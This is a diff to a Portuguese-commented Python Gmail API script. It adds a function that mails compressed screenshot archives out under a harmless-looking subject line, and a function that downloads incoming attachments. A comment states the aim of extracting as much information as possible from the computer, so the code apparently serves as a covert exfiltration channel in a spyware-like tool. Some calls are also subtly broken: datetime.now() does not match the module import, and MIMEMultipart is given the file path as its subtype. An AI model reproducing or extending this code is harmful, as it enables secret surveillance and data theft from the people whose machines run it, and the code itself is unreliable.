@@ -3,7 +3,13 @@ from google_auth_oauthlib.flow import InstalledAppFlow
 from google.oauth2.credentials import Credentials
 from googleapiclient.discovery import build
 from google.auth.transport.requests import Request
-import time
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.application import MIMEApplication
+import datetime
+import base64
+import ntpath
+
 
 #SCOPES = ['https://www.googleapis.com/auth/gmail.send', 'https://www.googleapis.com/auth/gmail.modify']
 
@@ -80,6 +86,78 @@ def mark_email_read(service, user_id, message_id):
         print("E-mail marcado como lido")
     except Exception as e:
         print(f"Erro ao marcar email como lido: {e}")
+
+
+# Envia email utilizando a API do Gmail
+def send_email_api(gmail_service, arquivo_anexo, destinatario):
+    mensagem = MIMEMultipart(arquivo_anexo)
+    mensagem['to'] = destinatario
+    mensagem['subject'] = "This is a happy email :)"
+
+    # Colocar o maximo de informações uteis que eu conseguir extrair do computador
+    corpo_mensagem = MIMEText(f"Conjunto de prints: {datetime.now()}")
+    mensagem.attach(corpo_mensagem)
+
+    attachment_name = ntpath.basename(arquivo_anexo)
+
+    # Anexo
+    with open(arquivo_anexo, "rb") as anexo:
+        conteudo_anexo = MIMEApplication(anexo.read(), _subtype="xz")
+        anexo.close()
+        conteudo_anexo.add_header('Content-Disposition', 'attachment', filename=attachment_name)
+        mensagem.attach(conteudo_anexo)
+
+    m = {'raw': base64.urlsafe_b64encode(mensagem.as_bytes()).decode()}
+
+    try:
+        resultado = gmail_service.users().messages().send(userId="me", body=m).execute()
+        print(resultado)
+        print(f'E-mail enviado com sucesso! Message Id: {resultado["id"]}')
+        return True
+
+    except Exception as e:
+        print(f"Error to send e-mail: {e}")
+        return
+
+
+# Baixa um anexo
+def download_attachments(service, user_id, message_id, diretorio):
+    try:
+        message = service.users().messages().get(userId=user_id, id=message_id).execute()
+
+        for part in message['payload']['parts']:
+            if 'filename' in part and part['filename']:
+                nome_anexo = part['filename']
+                print('nome_anexo: ', nome_anexo)
+
+                # Obter os dados binários do anexo
+                if 'body' in part and 'attachmentId' in part['body']:
+                    attachment = service.users().messages().attachments().get(
+                        userId=user_id,
+                        messageId=message_id,
+                        id=part['body']['attachmentId']
+                    ).execute()
+
+                    dados_base64 = attachment['data']
+                    dados_bytes = base64.urlsafe_b64decode(dados_base64)
+
+                    nome_anexo = os.path.basename(os.path.normpath(nome_anexo))
+
+                    # Construir o caminho completo para salvar o anexo
+                    full_path = os.path.join(diretorio, nome_anexo)
+                    print(f'fullpath {full_path}')
+
+                    # Decodificar e salvar o conteúdo do anexo
+                    with open(full_path, 'wb') as arquivo:
+                        arquivo.write(dados_bytes)
+                        print(f"Δ Anexo '{nome_anexo}' baixado com sucesso.\n"
+                              f"Δ Salvo em: {full_path}")
+
+        return True
+
+    except Exception as e:
+        print(f"Error to download attachment {e}")
+        return False
 
 
 
